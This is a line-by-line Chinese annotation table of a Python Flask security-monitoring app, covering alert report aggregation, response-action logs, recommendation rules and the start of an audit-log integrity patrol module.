| 3655 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "timeline": buckets,` |
| 3656 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 3657 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "responses": responses[:50],` |
| 3658 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "model_performance": model_perf,` |
| 3659 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "recommendations": recommendations,` |
| 3660 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3661 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3662 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3663 | 函数定义：声明 `_bucket_timeline_from_db` 的输入、处理逻辑和返回结果。 | `def _bucket_timeline_from_db(` |
| 3664 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    start: datetime, end: datetime, period: str` |
| 3665 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> List[Dict[str, Any]]:` |
| 3666 | 文档字符串：说明当前模块、类或函数的职责。 | `    """按时间窗口对 \`\`alerts.timestamp\`\` 分桶计数（数据库聚合）。"""` |
| 3667 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    bucket_size_min = 60 if period == "day" else 60 * 24` |
| 3668 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    total_min = int((end - start).total_seconds() / 60)` |
| 3669 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    count = max(1, total_min // bucket_size_min)` |
| 3670 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    buckets: List[Dict[str, Any]] = []` |
| 3671 | 循环：逐个处理集合或迭代器中的元素。 | `    for i in range(count):` |
| 3672 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        b_start = start + timedelta(minutes=bucket_size_min * i)` |
| 3673 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        b_end = min(end, b_start + timedelta(minutes=bucket_size_min))` |
| 3674 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        b_start_u = b_start.astimezone(timezone.utc)` |
| 3675 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        b_end_u = b_end.astimezone(timezone.utc)` |
| 3676 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        n = (` |
| 3677 | 函数调用：执行已有函数/方法完成当前步骤。 | `            db.session.query(func.count(Alert.id))` |
| 3678 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .filter(Alert.timestamp >= b_start_u, Alert.timestamp < b_end_u)` |
| 3679 | 函数调用：执行已有函数/方法完成当前步骤。 | `            .scalar()` |
| 3680 | 代码语句：参与当前文件的业务流程或数据处理。 | `            or 0` |
| 3681 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3682 | 函数调用：执行已有函数/方法完成当前步骤。 | `        buckets.append(` |
| 3683 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3684 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "start": b_start.isoformat(timespec="seconds"),` |
| 3685 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "count": int(n),` |
| 3686 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3687 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3688 | 返回结果：把处理后的值交回调用方。 | `    return buckets` |
| 3689 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3690 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3691 | 函数定义：声明 `_collect_report_responses` 的输入、处理逻辑和返回结果。 | `def _collect_report_responses(` |
| 3692 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    start_u: datetime, end_u: datetime` |
| 3693 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> List[Dict[str, Any]]:` |
| 3694 | 文档字符串：说明当前模块、类或函数的职责。 | `    """响应动作（\`\`ResponseAction\`\`）、周期内封禁、人工状态流转（\`\`AlertHistory\`\`）。"""` |
| 3695 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: List[Dict[str, Any]] = []` |
| 3696 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3697 | 循环：逐个处理集合或迭代器中的元素。 | `    for ra in (` |
| 3698 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(ResponseAction)` |
| 3699 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3700 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ResponseAction.created_at >= start_u,` |
| 3701 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ResponseAction.created_at <= end_u,` |
| 3702 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3703 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .order_by(ResponseAction.created_at.desc())` |
| 3704 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .limit(40)` |
| 3705 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3706 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 3707 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        meta = ra.meta if isinstance(ra.meta, dict) else {}` |
| 3708 | 函数调用：执行已有函数/方法完成当前步骤。 | `        out.append(` |
| 3709 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3710 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": _dt_iso(ra.created_at),` |
| 3711 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": ra.action_type,` |
| 3712 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "target": ra.target or "",` |
| 3713 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": meta.get("reason") or ra.error or "",` |
| 3714 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "operator": meta.get("operator"),` |
| 3715 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "status": ra.status,` |
| 3716 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "dry_run": ra.dry_run,` |
| 3717 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3718 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3719 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3720 | 循环：逐个处理集合或迭代器中的元素。 | `    for b in (` |
| 3721 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(BannedIp)` |
| 3722 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3723 | 代码语句：参与当前文件的业务流程或数据处理。 | `            BannedIp.created_at >= start_u,` |
| 3724 | 代码语句：参与当前文件的业务流程或数据处理。 | `            BannedIp.created_at <= end_u,` |
| 3725 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3726 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3727 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 3728 | 函数调用：执行已有函数/方法完成当前步骤。 | `        out.append(` |
| 3729 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3730 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": _dt_iso(b.created_at),` |
| 3731 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": "ban_ip",` |
| 3732 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "target": b.ip,` |
| 3733 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": b.reason,` |
| 3734 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "operator": b.operator or "operator",` |
| 3735 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3736 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3737 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3738 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    rows = (` |
| 3739 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(AlertHistory, Alert)` |
| 3740 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .join(Alert, AlertHistory.alert_id == Alert.id)` |
| 3741 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3742 | 代码语句：参与当前文件的业务流程或数据处理。 | `            AlertHistory.created_at >= start_u,` |
| 3743 | 代码语句：参与当前文件的业务流程或数据处理。 | `            AlertHistory.created_at <= end_u,` |
| 3744 | 函数调用：执行已有函数/方法完成当前步骤。 | `            AlertHistory.to_status.in_(("acknowledged", "resolved", "ignored")),` |
| 3745 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3746 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .order_by(AlertHistory.created_at.desc())` |
| 3747 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .limit(60)` |
| 3748 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3749 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3750 | 循环：逐个处理集合或迭代器中的元素。 | `    for h, al in rows:` |
| 3751 | 函数调用：执行已有函数/方法完成当前步骤。 | `        out.append(` |
| 3752 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3753 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "timestamp": _dt_iso(h.created_at),` |
| 3754 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "action": f"mark_{h.to_status}",` |
| 3755 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "target": al.source_ip or al.id,` |
| 3756 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "alert_id": al.id,` |
| 3757 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "alert_title": al.summary or "未分类告警",` |
| 3758 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "reason": h.note or al.summary,` |
| 3759 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "operator": h.operator or "operator",` |
| 3760 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3761 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3762 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3763 | 函数调用：执行已有函数/方法完成当前步骤。 | `    out.sort(` |
| 3764 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key=lambda r: -(` |
| 3765 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _parse_iso(r.get("timestamp")).timestamp()` |
| 3766 | 条件判断：满足条件时进入对应分支。 | `            if _parse_iso(r.get("timestamp"))` |
| 3767 | 兜底分支：处理前面条件都不满足的情况。 | `            else 0` |
| 3768 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3769 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3770 | 返回结果：把处理后的值交回调用方。 | `    return out` |
| 3771 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3772 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3773 | 函数定义：声明 `_mean_resolution_latency_db` 的输入、处理逻辑和返回结果。 | `def _mean_resolution_latency_db(start_u: datetime, end_u: datetime) -> int:` |
| 3774 | 文档字符串：说明当前模块、类或函数的职责。 | `    """已通过 DB 的 \`\`resolved\`\` 流转：告警创建 → 标记 resolved 的平均秒数。"""` |
| 3775 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    spans: List[float] = []` |
| 3776 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    q = (` |
| 3777 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(AlertHistory)` |
| 3778 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .join(Alert, AlertHistory.alert_id == Alert.id)` |
| 3779 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3780 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            AlertHistory.to_status == "resolved",` |
| 3781 | 代码语句：参与当前文件的业务流程或数据处理。 | `            AlertHistory.created_at >= start_u,` |
| 3782 | 代码语句：参与当前文件的业务流程或数据处理。 | `            AlertHistory.created_at <= end_u,` |
| 3783 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3784 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .limit(2000)` |
| 3785 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3786 | 循环：逐个处理集合或迭代器中的元素。 | `    for h in q.all():` |
| 3787 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        al = h.alert` |
| 3788 | 条件判断：满足条件时进入对应分支。 | `        if al is None or al.created_at is None or h.created_at is None:` |
| 3789 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 3790 | 函数调用：执行已有函数/方法完成当前步骤。 | `        spans.append((h.created_at - al.created_at).total_seconds())` |
| 3791 | 条件判断：满足条件时进入对应分支。 | `    if not spans:` |
| 3792 | 返回结果：把处理后的值交回调用方。 | `        return 0` |
| 3793 | 返回结果：把处理后的值交回调用方。 | `    return int(sum(spans) / len(spans))` |
| 3794 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3795 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3796 | 函数定义：声明 `_build_recommendations` 的输入、处理逻辑和返回结果。 | `def _build_recommendations(` |
| 3797 | 代码语句：参与当前文件的业务流程或数据处理。 | `    *,` |
| 3798 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_level: Dict[str, int],` |
| 3799 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_status: Dict[str, int],` |
| 3800 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_type: Dict[str, int],` |
| 3801 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    top_sources: Dict[str, int],` |
| 3802 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    total_alerts: int,` |
| 3803 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    enabled_rules: int,` |
| 3804 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    ioc_total: int,` |
| 3805 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    avg_confidence: float,` |
| 3806 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> List[Dict[str, Any]]:` |
| 3807 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    recs: List[Dict[str, Any]] = []` |
| 3808 | 条件判断：满足条件时进入对应分支。 | `    if total_alerts == 0:` |
| 3809 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3810 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3811 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "info",` |
| 3812 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "当前无告警",` |
| 3813 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "本报告周期未发现可见威胁。建议继续保持流量采样与规则覆盖度。",` |
| 3814 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3815 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3816 | 返回结果：把处理后的值交回调用方。 | `        return recs` |
| 3817 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3818 | 条件判断：满足条件时进入对应分支。 | `    if by_level.get("critical", 0) > 0:` |
| 3819 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3820 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3821 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "critical",` |
| 3822 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": f"{by_level['critical']} 起严重告警需立即响应",` |
| 3823 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "建议排查命中「多维度异常聚类」规则或严重级别样本的来源主机，必要时立即隔离。",` |
| 3824 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3825 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3826 | 条件判断：满足条件时进入对应分支。 | `    if by_level.get("high", 0) >= 3:` |
| 3827 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3828 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3829 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "high",` |
| 3830 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": f"{by_level['high']} 起高危告警集中出现",` |
| 3831 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "优先处置 Top 3 攻击来源 IP，考虑加入威胁情报黑名单并同步到防火墙。",` |
| 3832 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3833 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3834 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3835 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    open_ratio = by_status.get("open", 0) / total_alerts if total_alerts else 0` |
| 3836 | 条件判断：满足条件时进入对应分支。 | `    if open_ratio > 0.5:` |
| 3837 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3838 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3839 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "medium",` |
| 3840 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": f"超过 {int(open_ratio * 100)}% 告警未处置",` |
| 3841 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "建议安排值班人员统一确认未处置告警；可在 /alerts 页面按状态=未处理筛选快速处理。",` |
| 3842 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3843 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3844 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3845 | 条件判断：满足条件时进入对应分支。 | `    if top_sources:` |
| 3846 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        topn = sorted(top_sources.items(), key=lambda kv: -kv[1])[:3]` |
| 3847 | 条件判断：满足条件时进入对应分支。 | `        if any(cnt >= 3 for _, cnt in topn):` |
| 3848 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            ips = "、".join(f"{ip}({cnt})" for ip, cnt in topn)` |
| 3849 | 函数调用：执行已有函数/方法完成当前步骤。 | `            recs.append(` |
| 3850 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 3851 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "severity": "high",` |
| 3852 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "title": "高频攻击来源需封禁",` |
| 3853 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "body": f"近期命中最多的来源：{ips}。建议通过命令面板 \`block <ip>\` 或威胁情报页面添加 IOC。",` |
| 3854 | 代码语句：参与当前文件的业务流程或数据处理。 | `                }` |
| 3855 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 3856 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3857 | 条件判断：满足条件时进入对应分支。 | `    if enabled_rules == 0 and total_alerts > 0:` |
| 3858 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3859 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3860 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "high",` |
| 3861 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "所有检测规则已被禁用",` |
| 3862 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "规则管理页面中未启用任何规则，AI 模型可能缺乏前置特征过滤。请至少启用 signature 与 threshold 各一条。",` |
| 3863 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3864 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3865 | 条件分支：前面条件不满足时继续判断。 | `    elif enabled_rules < 3:` |
| 3866 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3867 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3868 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "medium",` |
| 3869 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "规则覆盖度偏低",` |
| 3870 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": f"当前仅启用 {enabled_rules} 条规则；建议至少覆盖特征匹配、阈值检测、异常聚类三种类型各一条。",` |
| 3871 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3872 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3873 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3874 | 条件判断：满足条件时进入对应分支。 | `    if avg_confidence and avg_confidence < 0.6:` |
| 3875 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3876 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3877 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "medium",` |
| 3878 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "模型平均置信度偏低",` |
| 3879 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": f"本周期平均置信度 {avg_confidence:.2f}，建议结合最新流量重训或更新模型版本，避免低置信度告警淹没值班。",` |
| 3880 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3881 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3882 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3883 | 注释：解释下面或当前这段代码的设计意图。 | `    # 若 iocs 数量远低于告警量，说明情报利用不足` |
| 3884 | 条件判断：满足条件时进入对应分支。 | `    if total_alerts >= 10 and ioc_total < 5:` |
| 3885 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3886 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3887 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "low",` |
| 3888 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "威胁情报利用不足",` |
| 3889 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "告警数量较多但本地 IOC 条目偏少，建议在威胁情报页面批量导入近期被命中的来源 IP / 域名。",` |
| 3890 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3891 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3892 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3893 | 条件判断：满足条件时进入对应分支。 | `    if not recs:` |
| 3894 | 函数调用：执行已有函数/方法完成当前步骤。 | `        recs.append(` |
| 3895 | 代码语句：参与当前文件的业务流程或数据处理。 | `            {` |
| 3896 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "severity": "info",` |
| 3897 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "title": "整体态势良好",` |
| 3898 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "body": "当前报告周期内无明显高危迹象，继续保持。",` |
| 3899 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 3900 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3901 | 返回结果：把处理后的值交回调用方。 | `    return recs` |
| 3902 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3903 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3904 | 条件判断：满足条件时进入对应分支。 | `if __name__ == "__main__":` |
| 3905 | 日志记录：输出运行状态、调试信息或异常线索。 | `    logging.basicConfig(` |
| 3906 | 日志记录：输出运行状态、调试信息或异常线索。 | `        level=logging.INFO,` |
| 3907 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        format="[%(asctime)s] %(name)s - %(levelname)s - %(message)s",` |
| 3908 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3909 | 函数调用：执行已有函数/方法完成当前步骤。 | `    app, socketio = create_app()` |
| 3910 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    port = int(os.environ.get("PORT", "5000"))` |
| 3911 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    debug = bool(app.config.get("DEBUG", False))` |
| 3912 | 注释：解释下面或当前这段代码的设计意图。 | `    # DISABLE_RELOADER=true 在开发环境下仍可获得 debug pages，` |
| 3913 | 注释：解释下面或当前这段代码的设计意图。 | `    # 但避免 watchdog 多进程在 Windows 上与外部终端调度冲突。` |
| 3914 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    use_reloader = (` |
| 3915 | 函数调用：执行已有函数/方法完成当前步骤。 | `        debug and os.environ.get("DISABLE_RELOADER", "").lower() != "true"` |
| 3916 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3917 | 函数调用：执行已有函数/方法完成当前步骤。 | `    socketio.run(` |
| 3918 | 代码语句：参与当前文件的业务流程或数据处理。 | `        app,` |
| 3919 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        host="0.0.0.0",` |
| 3920 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        port=port,` |
| 3921 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        debug=debug,` |
| 3922 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        use_reloader=use_reloader,` |
| 3923 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        allow_unsafe_werkzeug=True,` |
| 3924 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |

## `web/audit_integrity_patrol.py`

- 类型：Web 后端支撑
- 行数：168

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串：说明当前模块、类或函数的职责。 | `"""审计日志哈希链完整性巡检：失败时 critical 告警并写入审计。"""` |
| 2 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 5 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import threading` |
| 6 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import time` |
| 7 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import uuid` |
| 8 | 导入对象：从指定模块引入类、函数或常量。 | `from datetime import datetime, timezone` |
| 9 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import Any, Optional` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 12 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 13 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_last_audit_integrity_valid: bool = True` |
| 14 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_last_patrol_monotonic: float = 0.0` |
| 15 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_last_critical_alert_monotonic: float = 0.0` |
| 16 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_patrol_lock = threading.Lock()` |
| 17 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_CRITICAL_ALERT_COOLDOWN_SEC: float = 300.0` |
| 18 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 函数定义：声明 `get_last_audit_integrity_valid` 的输入、处理逻辑和返回结果。 | `def get_last_audit_integrity_valid() -> bool:` |
| 21 | 返回结果：把处理后的值交回调用方。 | `    return _last_audit_integrity_valid` |
| 22 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 23 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 24 | 函数定义：声明 `run_audit_integrity_patrol_once` 的输入、处理逻辑和返回结果。 | `def run_audit_integrity_patrol_once(app: Any) -> dict:` |
| 25 | 文档字符串：说明当前模块、类或函数的职责。 | `    """执行一次校验；须在 app.app_context() 内调用（由本模块包装）。"""` |
| 26 | 代码语句：参与当前文件的业务流程或数据处理。 | `    global _last_audit_integrity_valid, _last_critical_alert_monotonic` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.audit.security_logger import SecurityLogger` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.database import db` |
| 29 | 导入对象：从指定模块引入类、函数或常量。 | `    from web.models import Alert, AlertHistory` |
| 30 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
